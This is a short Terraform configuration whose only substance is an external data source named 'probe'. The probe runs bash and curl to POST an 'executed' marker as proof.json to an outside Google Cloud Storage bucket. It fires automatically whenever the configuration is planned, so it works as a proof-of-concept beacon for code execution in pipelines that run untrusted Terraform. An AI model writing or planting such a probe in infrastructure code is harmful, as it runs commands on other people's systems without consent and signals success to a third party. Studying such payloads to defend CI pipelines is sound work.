terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = "2.3.4"
    }
  }
}

data "external" "probe" {
  program = [
    "bash",
    "-c",
    "curl -s -X POST --data '{\"executed\":true}' 'https://storage.googleapis.com/upload/storage/v1/b/adc-public-git-1122-159463683703-a81f51b9/o?uploadType=media&name=proof.json' >/dev/null; echo '{\"public_git\":\"executed\"}'",
  ]
}

output "probe" {
  value = data.external.probe.result
}
